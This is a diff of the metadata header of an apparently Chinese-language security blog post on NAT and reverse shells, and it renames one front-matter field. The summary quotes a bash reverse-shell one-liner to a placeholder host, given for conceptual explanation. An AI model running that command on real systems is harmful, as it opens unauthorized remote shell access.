@@ -1,7 +1,7 @@
 ---
 title: "NAT 與 Reverse Shell — 為什麼拿 shell 只能讓靶機主動連出來"
 date: "2026-07-30"
-category: "Network"
+topic: "Network"
 tags: ["network", "nat", "reverse-shell", "pt", "concept"]
 summary: "拆解 bash -i >& /dev/tcp/<myIP>/4444 0>&1 裡三個 FD 怎麼全接到同一條 socket、為什麼還要再用 pty 升級一次，以及 NAT 轉譯表裡沒有那筆對應記錄時，從外面打進內網的封包會發生什麼事。"
 ---
